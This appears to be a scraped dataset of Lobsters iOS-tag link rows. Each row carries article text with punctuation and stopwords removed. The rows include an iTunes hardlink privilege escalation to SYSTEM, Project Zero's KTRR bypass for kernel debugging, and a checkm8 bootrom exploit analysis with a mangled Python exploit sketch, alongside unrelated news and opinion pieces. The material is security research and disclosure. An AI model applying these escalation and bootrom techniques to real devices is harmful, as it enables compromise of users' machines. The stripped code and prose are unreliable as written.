95,Lobsters,ios,Apple iOS,From iPhone to NT AUTHORITY\SYSTEM,https://decoder.cloud/2019/12/12/from-iphone-to-nt-authoritysystem/,iphone nt authoritysystem,previous post operation exploitable forshaw utilties yes work system shell boundary condition disclosure timeline possible countermeasure side note like,promised previous post show exploit printconfig dll real world example apple iphone well keep sorry tl dr time ago looking possible privileged file operation exploitable via hardlinks point directory c programdataapplelockdown caught attention folder used apple mobile device service installed itunes software service running local system privilege responsible handling communication via usb port apple device iphone ipad etc see standard user add file directory time new device plugged driver write pairing certificate file directory form udid plist udid universal id apple device let plugin apple device pairing certificate generated permission set file following see user read access file come funny part unplug device plugin magic happens granting user full control file observed strange behavior using procmon tool sysinternals setsecurity call made elevated context system grant full control user resource question operation exploitable yes got enter native hardlinks standard window user need special privilege create type link use forshaw utilties manage setting native hardlink file let point resource system full control going setting hardlink udid plist file licensertf located folder need plugin apple device order alter permission destination file yes work point piece puzzle need change destination file printconfigdll overwrite dll start xps print job finally enjoy system shell exercise left reader watch video poc boundary condition need user shell access window machine itunes along apple mobile device service installed tested latest itunes release time writing testing purpose need physical access machine order plugin apple device strictly necessary attacker scenario could delete plist file create hardlinks plist file pointing destination dll wait device plugin observed sometimes full permission set even without pairing device need investigate disclosure timeline september submitted issue productsecurity applecom september apple asked u resend screen shot october apple told u planning address issue future update october apple released version itunes fix issue asked several time case answer apple december informed apple would release public post issue december day since initial submission december apple released version itunes fix issue december still answer post published possible countermeasure waiting new hopefully patched release meantime could remove write permission user lockdown folder fine side note generic hardlink abuse work future release window latest insider preview m added supplementary check write access destination file get access denied error try create hardlink like like loading
96,Lobsters,ios,Apple iOS,Germany forces Apple to let other mobile wallet services use iPhone‚Äôs NFC chip,https://9to5mac.com/2019/11/15/use-nfc-chip/,germany force apple let mobile wallet service use iphone nfc chip,thirdparty apps three biggest bank restricting access nfc chip check youtube apple news,new german law passed yesterday requires apple allow mobile payment service access iphone nfc chip payment allow fully compete apple pay apple initially completely locked nfc chip could used apple pay later allowed thirdparty apps use chip always refused mobile payment bank demanding access nfc chip payment apps since australia three biggest bank claimed locking nfc chip anticompetitive behavior national australia bank commonwealth bank australia westpac banking corp want right access nfc chip iphones mobile wallet apps reuters report law name apple specifically would apply tech giant piece somewhat confusingly refers access nfc chip thirdparty payment apps apple pay german parliamentary committee unexpectedly voted latenight session wednesday force tech giant open apple pay rival provider germany came form amendment antimoney laundering law adopted late thursday full parliament set come effect early next year legislation name apple specifically force operator electronic money infrastructure offer access rival reasonable fee apple say change would harmful surprised suddenly legislation introduced fear draft law could harmful user friendliness data protection security financial information european country may follow germany example eu antitrust regular last month reported looking number alleged anticompetitive behavior restricting access nfc chip one investigation cover topic like prominence apple pay user set iphone like set notification pop setting app another possible issue fact apple let nfc payment service integrate wallet app meaning apple pay several exclusive integration io commission representative said looking possible anticompetitive market practice abusive conduct mean apple could forced allow user choose mobile payment app automatically opened iphone nfc chip come within range contactless payment pad ftc use income earning auto affiliate link check youtube apple news video
97,Lobsters,ios,Apple iOS,KTRW: The journey to build a debuggable iPhone,https://googleprojectzero.blogspot.com/2019/10/ktrw-journey-to-build-debuggable-iphone.html,ktrw journey build debuggable iphone,,posted brandon azad project zero role project zero use tooling used external io security researcher particular developmentfused iphones hardware debugging capability like jtag enabled believe access device put obtain significant advantage researcher wish use thus early year decided would try find way build capability using regular iphones buy apple store identified iboot ktrr primary area research spent several month looking vulnerability june discovered soc used iphone iphone x coresight external debug register enabled combined capability reversed proprietary debugging register called dbgwrap sufficient debug cpu time operation including execution reset vector core sleep mmu ktrr reenabled singlestepping execution reset vector modifying register state key point possible skip mmu ktrr lockdown remap protected kernel memory writable used capability build hardwarelevel singlestep kernel debugger iphone x called ktrw used lldb ida pro work offtheshelf lightning cable research conducted released io securerom exploit independent bootstrapping problem security research iphones hard opinion much harder need apple done impressive job locking device security improvement certainly welcome mean security researcher invest lot time effort create viable research platform need maintain research platform create perverse incentive wellintentioned security researcher one common outcome researcher hoard vulnerability reporting keeping rest bootstrapping course le ideal since vulnerability could simultaneously used attack user alternatively many security researcher able acquire developmentfused iphones hardware debugging feature swd jtag enabled allowing debug main application processor ap peripheral like always processor aop secure enclave processor sep halting execution bootloader possible patch kernel disable security feature kernel even chance run make device extremely useful security research recently virtualization solution gained prominence io security research community principle virtualization offer way conduct security testing io without subject hardware restriction prevent kernel modification caveat product often accessed web would mean experiment conducted virtualized device could theory visible company providing service none option sit well withhold security bug use developmentfused device feel appropriate run sensitive experiment could disclose potential io security vulnerability third party server put disadvantage relative adversary developing deploying capability may using strategy thus back march decided would worthwhile investigate whether possible create homebrewed development iphone using certified apple part ktrr hardware mitigation heart make conducting security research io difficult hardware mitigation called ktrr likely stand kernel text readonly region siguza excellent article ktrr highly recommend reading since apple publish detail hardware mitigation hard know exact boundary mitigation post try use terminology suggested public xnu source even though differs term used article effect ktrr stronger form wx protection enforced memory access implemented memory management unit mmu memory controller apple memory controller appears referred amcc source mmus amcc programmed physical address range respectively referred mmu ktrr region amcc ktrr region mmu ensures writes physical address within mmu ktrr region instruction fetch address outside region generate synchronous exception likewise amcc ensures writes issued memory controller physical address inside amcc ktrr region discarded way kernel lock executable code readonly data modified new executable code injected order lock mmu apple defined three new system register define lower upper bound mmu ktrr region lockdown register value written three register locked longer modified although still lose value core reset core wake sleep mmu enabled enforces memory writes mmu ktrr region instruction fetch outside region generate synchronous exception mean regardless permission bit specified page table regardless configuration system register including aprr register impossible memory writable executable impossible change memory executable however implementing ktrr mmu alone enough ensure kernel code integrity example dma attack attack peripheral would reach memory controller without first passing mmu application processor thus apple bring ktrr amcc well readonly region lockdown register accessible via memorymapped io mmio combination implementing ktrr mmu amcc make extremely effective mmu amcc ktrr region protect critical kernel resource including page table root page table describing readonly region instruction might used break ktrr moved special page lastpinst outside mmu ktrr range making nonexecutable inside amcc ktrr range making nonwritable particular executable copy instruction msr set new page table root address translation kernel half address space instruction msr could used turn mmu last part true apple added new hardware mitigation brings back executable memory order bypass ktrr load new executable code one would need find way prevent mmu ktrr lockdown occurring however attack surface incredibly slim core wake sleep system begin executing reset vector lowresetvectorbase program lock mmu ktrr register within first instruction goal research iphone know exactly feature think would useful homebrewed research iphone important feature also hardest achieve possible patch ktrrprotected kernel memory particular patch textexec segment contains kernel executable code possible would become easy disable mitigation like codesigning make userspace security research difficult possible perform singlestep io kernel debugging would aid runtime analysis kernel make easier demonstrate incorrect behavior poc vulnerability tied specific version io possible debug new kernel version come either updating device normally chainloading updated kernel usable existing debugging tool particular wanted able perform kernel debugging live productionfused iphone using lldb ida pro relatively easy port newer version io fact research concept nothing new goal partially demonstrated back io goal demonstrated io io yalu ktrr bypass luca todesco qwertyoruiopz demonstrated ktrr bypass io remapped kernel dataconst segment normally protected ktrr writable technique relied two component one gain code execution reset another remap ktrrprotected memory first luca used fact writable data used reset path lowresetvectorbase gain code execution every reset ktrr bypass since ktrr already initialized mmu turned point gained code execution useful persisting true bypass would applied every time core reset second offbyone error mmu ktrr lockdown code lowresetvectorbase resulted lastpinst page accidentally included mmu ktrr region meaning instruction msr left executable even mmu turned take advantage luca used first capability execute rop payload reset rop payload would bypass ktrr using executable msr instruction set new page table base remapped dataconst new writable physical page reason textexec left readonly bypass ran ktrr already initialized mmu even though page table could changed mmu still prevented physical page except original one protected ktrr amcc region executed thus remained impossible patch kernel executable code io build io kernel debugger precedent work came io ian beer released asyncwakeioswithkdp singlestep kernel debugger worked lldb absolutely read slide mosec talk build io kernel debugger explain great detail accomplished also recommend looking source code well commented look architecture reference manual quote version ea latest time writing chapter describes interesting feature called selfhosted debug selfhosted debug support debugging generation handling debug exception taken using exception model described chapter system level programmer model within chapter debugger mean part operating system higher level system software handle debug exception program debug system register essentially architecture allows operating system program special debug register order act debugger catching exception occur certain debugrelated event encountered according manual relevant exception type include breakpoint instruction exception generated brk instruction executed breakpoint exception generated hardware breakpoint hit watchpoint exception generated hardware watchpoint hit software step exception generated software singlestep operation completes debug register configured properly event delivered synchronous exception exception vector specified register circumstance debug exception actually generated delivered pe generate particular debug exception debug exception enabled current exception level security statesee enabling debug exception current exception level page breakpoint instruction exception always enabled current exception level security state debugger enabled particular debug exceptionall debug exception except breakpoint instruction exception enable control contained see debug exception enable control page reading mentioned section find following register relevant enabling selfhosted debug pstate process state real register collection important processor state information relevant flag debugging exception mask bit debug exception mask set debug exception suppressed field reset exception taken f asynchronous exception mask bit bit mask serror irq fiq interrupt respectively monitor debug system control register register hold main debug configuration option mde monitor debug enable control whether breakpoint watchpoint exception enabled kde kernel debug enable enables kernel running catch debug exception dbgbcr n debug breakpoint control register n n register control behavior hardware breakpoints dbgbvr n debug breakpoint value register n n register contain information match virtual address corresponding breakpoint trigger dbgwcr n debug watchpoint control register n n register control behavior hardware watchpoints dbgwvr n debug watchpoint value register n n register contain information match virtual address corresponding watchpoint trigger basically ian debugger worked finding appropriate system call mach trap gadget sequence set register necessary value thus enabling hardware breakpoints allowing kernel mode generate debug exception final piece catching debug exception able trigger kernel breakpoint exception much use somehow catch exception dump register memory resume normal execution ian found exception handling function slehsynchronous actually enters deliberate infinite loop catch breakpoint exception kernel void slehsynchronous armcontextt context esr vmoffsett far esrexceptionclasst class esrec esr armsavedstatet state context s switch class case fscdebugfault issssdefsc esr kprintf hardware breakpoint debug exception kernel hanging design n unreachableokpush debuggercall excbreakpoint context s break unreachableokpop panic unsupported class u event code state p class u esr u far p class state class esr void far assert unreachable break point thread generated breakpoint exception enters infinite loop register state time exception spilled memory making possible inspect modify register value finally ian able restart execution debugged thread waiting preempted spinning loop modifying spilled state thread resume execution desired location ian asyncwake kernel debugger able achieve two goal mentioned debugger supported singlestepping worked lldb certainly enough make useful research platform however apple mitigated gadget ian used meaning could nt use technique recent io version ideally wanted something met five goal kernel patching singlestep debugging support io version compatibility lldb easy maintenance across io version turned iboot researching iboot initial goal find vulnerability iboot would allow boot patched kernelcache iboot apple secondstage bootloader iphone run securerom responsible loading kernelcache verifying signature jumping code execution iboot possible boot kernelcache patched disable ktrr enable debugging feature two reason iboot particularly attractive research target first iboot bug easily check updateability box iboot bug could theoretically boot kernelcache want allowing upgrade downgrade io version arbitrarily even bug fixed iphones vulnerable iboot version still able boot latest version io patched kernel second iboot bug could make possible load patched kernelcache even kernel vulnerability known currently order develop io kernel research platform need already kernel vulnerability unless withhold bug make difficult analyze latest kernel version known vulnerability fixed however iboot entry point need kernel vulnerability conduct research ultimately end finding vulnerability iboot said believe bug exist could interesting area future research path lead debug register eventually number thing drew away iboot back ktrr particular revisit concept debug register read somewhere exact source lost history debug register ian used io kernel debugger dbgbcr n etc also accessible via memorymapped interface true would mean using register singlestep kernel debugging would probably possible even apple mitigated specific gadget used initialize looking architecture reference manual table content noticed selfhosted debug chapter one place debugging mentioned fact whole section part h chapter devoted another debugging interface called external debug lowresetvectorbase xnu reset vector first instruction unlock core debuggingmsr xzr mosec zhenyu ning fengwei zhang presented interesting attack android platform called nailgun nailgun attack abuse debug register enabled certain android device break privilege barrier example extracting fingerprint image stored trustzone protected memory thus debug register really mind finally decided pay attention odd panic message occasionally encountered experiment telling ever played around iphone managed get core stuck infinite loop interrupt disabled may received panic message go something like panicstring attempting forcibly halt cpu failed halt error halt supported configurationndebugger synchronization timed waited nanosecondsnpanic cpu caller wdt timeout cpu failed respond buildroot message say application processor watchdog timer wdt timed waiting cpu core happens core fails check applearmwatchdogtimer kext several second caught attention first part panic string attempting forcibly halt cpu forcibly halting cpu running really sound like sort cpu control register might involved error string grep starting place searching string xnu source found function debuggerxcallenter file osfmkarmmodeldepc contained following interesting snippet cpu maxcpu cpu proceedonsyncfailure paniclogappendnoflush attempting forcibly halt cpu dn cpu dbgwrapstatust haltstatus mldbgwraphaltcpu cpu haltstatus paniclogappendnoflush cpu failed halt error sn cpu haltstatus mldbgwrapstrerror haltstatus comment debuggerxcallenter state function responsible interrupting core ap core run singlethreaded context seeing loop function mldbgwraphaltcpu seems one actually work halt specific core looking file osfmkkerndebugc see debuggerxcallenter indeed called part panic path mldbgwraphaltcpu actually halt running cpu core implementation file filled interesting information implementation mldbgwraphaltcpu dbgwrapstatust mldbgwraphaltcpu int cpuindex timeoutns cpudatat cdp cpudatap cpuindex cdp null cdp coresightbase coresightutt return dbgwraperrunsupported volatile dbgwrapregt dbgwrapreg volatile dbgwrapregt cdp coresightbase coresightutt dbgwrapregoffset mldbgwrapcpuishalted cpuindex return dbgwrapwarnalreadyhalted clear writable bit besides dbghalt none powerdown reset bit must set dbgwrapreg dbgwrapdbghalt else return dbgwrapsuccess tell u lot tantalizing information cpudatap function retrieves pointer current core cpudata struct whatever coresightbase array one ap core see assignment value derived array volatile variable called dbgwrapreg name fact declared volatile strongly suggest dbgwrapreg pointer sort mmio reading writing directly read write corespecific register comment suggests dbgwrap register contains bit involved halting powering resetting core real gem bit keep scrolling past mldbgwraphaltcpu find fascinating function called mldbgwraphaltcpuwithstate dbgwrapstatust mldbgwraphaltcpuwithstate int cpuindex timeoutns dbgwrapthreadstatet state cpudatat cdp cpudatap cpuindex cdp null cdp coresightbase coresighted return dbgwraperrunsupported ensure memorymapped coresight register written volatile cdp coresightbase coresighted armdebugoffsetdbglar armdbglockaccesskey dbgwrapstatust status mldbgwraphaltcpu cpuindex timeoutns core fully powered eg idling wfi still halted dbgwrap register certain coresight register edprsr alwayson domain however edscreditr alwayson domain generate parity abort read edprsr safely read case o lock default set clear first thing use detect offline state volatile cdp coresightbase coresighted edprsrregoffset edprsroslk bzero state sizeof state return dbgwrapwarncpuoffline instr unsigned int sizeof state x sizeof state x instr msr x mldbgwrapstuffinstr cdp instr timeoutns status state x mldbgwrapreaddtr cdp timeoutns status instr msr fp mldbgwrapstuffinstr cdp instr timeoutns status state fp mldbgwrapreaddtr cdp timeoutns status instr msr lr mldbgwrapstuffinstr cdp instr timeoutns status state lr mldbgwrapreaddtr cdp timeoutns status stack pointer ca nt used register operand msr register treated xzr rather sp used transfer operand instead load sp gpr already saved store register dtr chosen temporary gpr since reserved abi unused xnu overwriting pose least risk causing trouble external debugger instr mov sp mldbgwrapstuffinstr cdp instr timeoutns status instr msr mldbgwrapstuffinstr cdp instr timeoutns status state sp mldbgwrapreaddtr cdp timeoutns status reading pc eg adr undefined debug state instead use contains pc time entry debug state instr mr mldbgwrapstuffinstr cdp instr timeoutns status instr msr mldbgwrapstuffinstr cdp instr timeoutns status state pc mldbgwrapreaddtr cdp timeoutns status reading cpsr undefined debug state instead use contains cpsr time entry debug state instr mr mldbgwrapstuffinstr cdp instr timeoutns status instr msr mldbgwrapstuffinstr cdp instr timeoutns status state cpsr mldbgwrapreaddtr cdp timeoutns status return status mldbgwraphaltcpuwithstate appears halt specified cpu core retrieve register state remarkable remarkable way order retrieve value register halted cpu core function actually force halted cpu execute instruction write generalpurpose register value special debug register called instruction generated programmatically fly preexisting instruction protected ktrr mean least theory might possible make cpu core execute ktrrsensitive instruction like msr even copy instruction ktrrprotected memory digging deeper next step figure debug register actually enabled bit research revealed register mentioned dbgwrapc related feature called external debug debug architecture embedded called coresight let start latter external debug interface much simpler describe documented part h architecture reference manual like selfhosted debug provides debug exception cause core execute debugger code exception vector external debug provides debug event cause core enter debug state debug event mentioned manual exception catch debug event external debugger program core generate exception catch debug event every time core enters particular exception level reset catch debug event event generated every time core reset execute reset vector breakpoint debug event event generated core hit hardware breakpoint watchpoint debug event event generated core hit hardware watchpoint halting step debug event event generated core completes executing instruction part singlestep operation debug event occurs core halt enter debug state manipulated external debugger manual external debug debug event allow external debugger halt pe pe enters debug state pe debug state stop executing instruction location indicated program counter instead controlled external debug interface instruction transfer register itr pass instruction pe execute debug state debug communication channel dcc pass data pe debugger pe service interrupt debug state instruction transfer register itr debug communication channel dcc respectively responsible making halted core execute instruction transferring data halted core mldbgwraphaltcpuwithstate order read register halted core function mldbgwrapstuffinstr us memorymapped itr supply halted core instruction move desired register value system register value read function mldbgwrapreaddtr using memorymapped dcc register finding register xnu code seems suggest external debug register exist find tracing xnu source find function configurecoresightregisters static void configurecoresightregisters cpudatat cdp coresight register optional device tree provide cpuregmappaddr assume coresight register supported cdp cpuregmappaddr coresightregions skip cti register debugonly present production hardware least one known cyclone erratum involving cti rdar known client need kernel unlock cti safer avoid access coresightcti continue skip debugonly register production chip coresighted coresightutt coresightdebugenabled continue cdp coresightbase addr cdp cpuregmappaddr coresightoffset cdp coresightbase vmoffsett mliomap addr coresightsize suggests coresight register external debug crosstrigger interconnect cti something called utt mapped offset fixed base address supplied io device tree device tree passed xnu iboot specifies parameter system hardware including physical address special hardware register used interact device case comparing device tree value cpuregmappaddr read runtime learned base address coresight register cpu core n found device tree property cpuscpu n regprivate iphone address n core n thus assuming enabled one would need order access external debug register map physical address n whatever regprivate address device tree read write offset available manual corresponding register testing debug register register used mldbgwraphaltcpuwithstate documented manual know base address mapped necessarily mean feature implemented accessible production hardware order find needed test whether debug authentication signal whether debug register actually worked according manual implementationdefined authentication interface external debug feature authentication signal corresponding debug feature disabled signal debug feature available check debug authentication signal enabled read value external debug register offset architecture provides four signal snid secure noninvasive debug sid secure invasive debug nsnid nonsecure noninvasive debug nsid nonsecure invasive debug debugging feature need bypass ktrr rely nsnid nsid enabled surprisingly reading register via mmio produced suggesting signal fact enabled next step test whether mldbgwraphaltcpuwithstate could actually halt core execute instruction read core register state modifying voucherswap map coresight register manually call mldbgwraphaltcpuwithstate saw following output output window register value read mldbgwraphaltcpuwithstate look valid thus entirely possible execute dynamicallygenerated instruction halted cpu core production iphones even remarkable screenshot appears core halted executing code reset vector mmu value cpsr show core executing kernel mode interrupt disabled yet pc value normal kernel address fact physical address corresponding unslid kernel virtual address near end lowresetvectorbase specifically instruction load address constbootargs verifying reset handler reason remarkable open another possible technique bypass ktrr given halt core execute instruction mmu turned perhaps possible use debug register modify execution reset vector prevent ktrr ever enabled mmu debugging feature needed actually even though proved possible execute instruction debugged core mmu alone necessarily enough bypass ktrr example even though use dbgwrap halt core external debug interface contains mechanism get core debug state resume normal execution called restarting thus needed find feature would make debugging register useful first thing looked finding useful instruction execute debugged core even though core execute instruction written itr instruction available debug state manual specifies list instruction available related moving value register accessing system register loading storing memory even fewer actually available reason load store instruction fail execute debug state even instruction read write system register msr mr instruction work debug state thus another idea investigated whether exists system register shared core writing would change global state way facilitates ktrr bypass however without better knowledge apple proprietary system register unable find anything worked finally decided turn back dbgwrap register mentioned dbgwrapc comment mldbgwraphaltcpu suggests register contains many different bit control behavior core yet bit dbghalt halt core dbgack check core halted defined file thus suspected might bit interest performed experiment figure might turn dbgwrap actually contains least undocumented bit extremely useful setting bit cause core enter debug state next time reset execute reset vector setting bit cause core restart exiting debug state resuming normal execution setting bit seems prevent core resetting long phone plugged active ie sleeping everything necessary bypass ktrr bypassing ktrr method chose disable ktrr mmu repeated core using dbgwrap configure core enter debug state next time reset wait core halt halted execute first instruction lowresetvectorbase ktrr register yet initialized using external debug register dbgwrap repeatedly singlestep execution core step read pc value debugged core determine instruction executed core execute ktrr initialization instruction use external debug register overwrite value debugged core general purpose register skip ktrr initialization use dbgwrap restart core exiting debug state ktrr disabled mmu meaning possible execute memory outside ktrr readonly region possible set custom page table base remap kernel onto fresh writable physical page outside amcc ktrr range ktrw order make functionality useful packaged ktrr bypass io kext loader kernel debugger named ktrw ktrw make possible compile c program macho file dynamically load link binary running kernel io kernel debugger implement gdb stub accessible usb course ktrw particular gdb stub kext significantly complicated ktrr bypass encountered numerous interesting challenge needed overcome including writing usb stack scratch undocumented hardware however ktrw source code reasonably well commented refer interested reader particular ktrr bypass work device debugging register appear accessible device appear partially functional differs device tree difficult know sure whether debugging register truly unusable device without greater insight hardware might work perfectly slight variation setup using first configured using proprietary mechanism security vulnerability reported apple project zero issue neither project zero apple considers existence debug register security vulnerability reason order use register bypass ktrr one would already need kernel arbitrary readwrite capability point device considered fully compromised anyway attacker kernel readwrite access data used app system evidence kernel readwrite attacker need practice highly recommend reading ian phenomenal technical analysis five inthewild io exploit chain including analysis implant found attacker used kernel readwrite capability launch implant binary implant launched get access data exfiltrates using normal userspace apis research phone securerom exploit apple announced blackhat considering providing researchfused device security researcher genuinely hope deliver promise soon without requiring ndas restriction placed security researcher like personally believe would tremendous step forward open security research presence debug register allow one bypass ktrr debug kernel even absence securerom vulnerability practice however publication securerom exploit solves goal listed research iphone provides added benefit needing kernel vulnerability expect future research platform based around capability conclusion one thing hoped convey post path discovering ktrr bypass surprisingly straightforward considering ian prior work looking selfhosted debug extensive arm documentation external debug public research nailgun attack android xnu source practically spelling execute dynamically generated instruction confident first one discover issue general fear secrecy surrounding knowledge technique io security research community allowing privately held stateoftheart security research diverge publicly shared stateoftheart happens put defender systemic disadvantage suspect ktrr bypass bypass particular one example divergence spoken several member io research community believe knowledge debug register widespread certain circle example xerub xerub presented slide mosec hinted surprising capability offered debugging feature siguza hinted ktrr bypass blog post aprr furthermore suspect ktrr bypass technique privately discovered technique way bypass ktrr almost certainly technique still work yet researcher rarely ever publicly admit capability make wonder technique capability known private circle making ktrw public want facilitate security researcher like interested understanding iphone work improving security hopefully narrow gap publicly shared privately held capability process acquire developmentfused device access trove information researcher choose use device adversary looking harm iphone user already capability hopefully eye io internals continue improve security long run
98,Lobsters,ios,Apple iOS,"Apple, Your Developer Documentation is‚Ä¶ Missing",https://v4.chriskrycho.com/2019/apple-your-developer-documentation-is-garbage.html,apple developer documentation missing,assumed audience rightly pointed learning wrote made official policy,assumed audience practitioner interested lookerson software apple edit folk rightly pointed use garbage suggests problem quality existing documentation retitled post capture problem massive absence documentation see original title way slug past month trying get speed apple developer ecosystem part working rewrite project mean learning swift swiftui barely io macos apis terrible number part ecosystem entirely undocumented frankly shocking context spent last five year working actively javascript frontend application development world working first angularjs emberjs ember doc reputation pretty bad year working gone decent really good hand working angularjs year ago often threw hand quiet despair utter lack explanation occasionally inane explanation core concept thought would absolute worst massive tech company case google providing public apis could possibly wrong current state apple software documentation worst ever seen framework anywhere swift relatively well covered courtesy wellwritten wellmaintained book good news end swiftui entirely even single line explanation given type modifier swift package manager okay doc finding limit official doc difficult impossible got ground truth stack overflow question repeatedly reduced searching wwdc video transcript figure someone say something relevant whatever working frankly unacceptable ember ecosystem simple rule code get ship unless documented go rust know wrote rfc made official policy understand apple api developer often work different context open source face crunch around release tied hardware product shipping end day vending api done documented full stop given know apple approach problem individual engineer responsible writing doc even member dedicated documentation team responsible writing doc make le failure apple engineering organization job api engineering organization support consume api doubt many apple api engineer would love thing documented likewise doubt documentation team understaffed work wrong doubt apple engineering culture value even worse indictment engineering culture kind thing change level entire engineering organization apple claim interested building platform accessible brand new developer experienced grayhaired folk around since next day right even close decade software development belt fair bit language rich type system functional programming idiom stuff hard figure imagine mindbogglingly terrible experience would someone starting software coming experience language like ruby python javascript would completely impossible learn apple want developer love good developer want flee worried web everywhere microsoft coming need take seriously adopt mentality served framework language well documented done
99,Lobsters,ios,Apple iOS,Perfectly Cropped,https://tyler.io/perfectly-cropped/,perfectly cropped,,fun personal story go wrong otherwise fine ui thing redesigned wife typically charge phone desk day leave plugged overnight mean io software update never happens automatically recently upgraded io day ago fast forward today claimed save photo phone someone else texted first thought oh god something icloud account tweeted day ago call start debugging speaker phone app message tapping share button box arrow yes save option send people make reminder note stuff like send screenshot ohhh scroll know explain difference apps left right action scrolling save option send another screenshot tapped button pick apps show need scroll main screen look black white icon bottom point second silence yell oh god like dumb new music app even know could scroll know option share sheet using iphone happens right height perfectly crop share sheet take look first screenshot sent copy action perfectly spaced bottom screen appear like option since io place macos offer visual affordances like scroll indicator idea content developer eye design certainly designer know solution type accidental ui bug see impact aging parent time first time one obviously confused wife caught surprise
100,Lobsters,ios,Apple iOS,Technical analysis of the checkm8 exploit,https://habr.com/en/company/dsec/blog/472762/,technical analysis exploit,introduction history ipwndfu announced littlelailo apollotxt necessary info usb http wwwusborg usb nutshell analysis apollotxt apollotxt http analysis heap fengshui description allocation freeing io buffer without clearing global state overwriting heap placing payload execution uemu execution overwriting configuration descriptor changing overwriting pointer request handler copying request handler memory area implementation exploit lower level working usb proofofconcept ipwndfu place conclusion special jtagswd cable extremely hard get special service reference jonathan levin o internals iboot apple io security guide littlelailo apollotxt usborg usb nutshell ipwndfu ipwndfu fork linushenze,likely already heard famous exploit us unfixable vulnerability bootrom idevices including iphone x article provide technical analysis exploit figure cause vulnerability read russian version introduction first let briefly describe booting process idevice role bootrom aka securerom play detailed information found booting look like device turned bootrom executed first main task platform initialization necessary platform register installed cpu initialized etc verification transfer control next stage bootrom support parsing image bootrom access gid key decrypting image image verification bootrom builtin public apple key necessary cryptographic functionality restore device booting nt possible device firmware update dfu bootrom small size called light version iboot share system library code although unlike iboot bootrom updated put internal readonly memory device manufactured bootrom hardware root trust secure boot chain bootrom vulnerability may allow attacker control booting process execute unsigned code device history exploit added ipwndfu author september time announced update twitter provided description additional information exploit according thread found useafterfree vulnerability usb code patch diffing iboot io beta summer bootrom iboot share code including usb vulnerability also relevant bootrom follows exploit code vulnerability exploited dfu mode one transfer signed image device via usb booted later example useful restoring device unsuccessful update day user littlelailo said found vulnerability back march published description apollotxt description corresponded although detail exploit become clear upon reading decided write article describe detail exploitation execution payload bootrom based analysis exploit resource mentioned source code ibootsecurerom leaked february also used data got experiment done test device iphone using got dump securerom secureram also helpful analysis necessary info usb since vulnerability usb code necessary understand interface work full spec found http wwwusborg long read purpose usb nutshell enough mention relevant point various type usb data transfer dfu control transfer mode used read mode transaction stage setup stage setup packet sent following field bmrequesttype defines direction request type recipient brequest defines request made wvalue windex interpreted depending request wlength specifies length sentreceived data data stage data stage optional stage data transfer depending setup packet sent setup stage data sent host device vice versa data sent small portion case apple dfu byte host want send another portion data sends token data host ready receive data device sends token device status stage last stage status whole transaction reported request host sends token device must respond zerolength packet request host sends token zerolength packet scheme show request took ack nack handshake packet purpose important exploit analysis apollotxt began analysis vulnerability apollotxt document describes algorithm dfu mode http usb started get image dfu dfu register interface handle command allocates buffer input output send data dfu setup packet handled main code call interface code interface code verifies wlength shorter input output buffer length case update pointer passed argument pointer input output buffer return wlength length want recieve buffer usb main code update global var length get ready recieve data package data package recieved get written input output buffer via pointer passed argument another global variable used keep track many byte recieved already data recieved dfu specific code called go copy content input output buffer memory location image later booted usb code reset variable go handel new package dfu exit input output buffer freed parsing image fails bootrom reenters dfu first checked step source code iboot ca nt use fragment leaked code use pseudocode got reverseengineering securerom ida easily find source code iboot navigate dfu initialized io buffer allocated usb interface processing request dfu registered setup packet request dfu come proper interface handler called request eg image sent case successful execution handler return address io buffer transaction well length data expects receive value stored global variable screenshot show dfu interface handler request correct address io buffer allocated dfu initialization expected length data setup packet returned data stage portion data written io buffer io buffer address offset received counter updated expected data received interface data handler called global state transaction cleared dfu data handler received data moved memory area loaded later based source code iboot area apple device called insecurememory device exit dfu mode previously allocated io buffer freed image successfully acquired dfu mode verified booted error impossible boot image dfu initialized whole process repeat beginning described algorithm useafterfree vulnerability send setup packet time image uploading complete transaction skipping data stage global state remain initialized next dfu cycle able write address io buffer allocated previous iteration dfu know useafterfree work question overwrite anything next iteration dfu another initialization dfu previously allocated resource freed allocation memory new iteration exactly turned another interesting memory leak error allows exploiting useafterfree analysis let get sake demonstration use simplified version exploit iphone took code related platform changed order type usb request without damage functionality also got rid process building payload found original file easy spot difference version device usrbinenv python import def main print exploit device dfuacquiredevice start timetime print found deviceserialnumber pwnd deviceserialnumber print device already pwned dfu mode executing exploit return payload exploitconfig deviceserialnumber callbackchain structpack callbackchain heap fengshui stall device leak device range noleak device dfuusbreset device dfureleasedevice device set global state restart usb device dfuacquiredevice deviceserialnumber device device dfureleasedevice device timesleep heap occupation device dfuacquiredevice deviceserialnumber stall device leak device leak device device range len payload device payload dfuusbreset device dfureleasedevice device device dfuacquiredevice pwnd deviceserialnumber print error exploit failed device enter pwned dfu mode sysexit print device pwned dfu mode print second timetime start dfureleasedevice device name main main operation several stage heap fengshui allocation freeing io buffer without clearing global state overwriting usbdeviceiorequest heap useafterfree placing payload execution callbackchain execution shellcode let look stage detail heap fengshui think interesting stage spend time describing stall device leak device range noleak device dfuusbreset device dfureleasedevice device stage necessary arranging heap way beneficial exploitation useafterfree first let consider call stall leak noleak def stall device device def leak device device def noleak device device wrapper devicectrltransfer ignoring exception arising execution request wrapper libusbsubmittransfer function libusb asynchronous execution reqeust following parameter passed call device number data setup packet find description bmrequesttype brequest wvalue windex length data wlength data data stage request timeout argument bmrequesttype brequest wvalue windex shared three request type bmrequesttype direction data stage device host standard request type device recipient request brequest request get descriptor getdescriptor wvalue wvaluehigh defines type descriptor string usbdtstring wvaluelow index string descriptor corresponds device serial number case string srtg windex indentifer string language whose value relevant exploitation changed request byte allocated heap object following structure interesting field object callback next callback pointer function called request done next pointer next object type necessary organizing request queue key feature stall use asynchronous execution request minimum timeout lucky request canceled o level remain execution queue transaction wo nt complete plus device continue receiving upcoming setup packet place necessary execution queue later experimenting usb controller arduino found successful exploitation need host send setup packet token transaction canceled due timeout incomplete transaction look like besides request differ length one unit standard request standard callback look like value iolength equal minimum wlength request setup packet original length requested descriptor due descriptor quite long control value iolength within length value gsetuprequestwlength equal value wlength last setup packet case thus request formed call stall leak completed condition terminal callback function satisfied usbcoresendzlp called call creates null packet zerolengthpacket add execution queue necessary correct completion transaction status stage request completed calling function usbcorecompleteendpointio first call callback free request memory request complete whole transaction complete also usb reset signal resetting usb received request execution queue completed selectively calling usbcoresendzlp going execution queue freeing request afterward gain sufficient control heap exploitation useafterfree first let look request cleanup loop see queue emptied canceled request run completed usbcorecompleteendpointio request allocated usbcoresendzlp placed ep iohead usb reset done information endpoint clear including pointer iohead iotail zerolength request remain heap thus create small chunk amidst heap scheme show done heap securerom new memory area allocated smallest proper free chunk creating small free chunk using method described control allocation 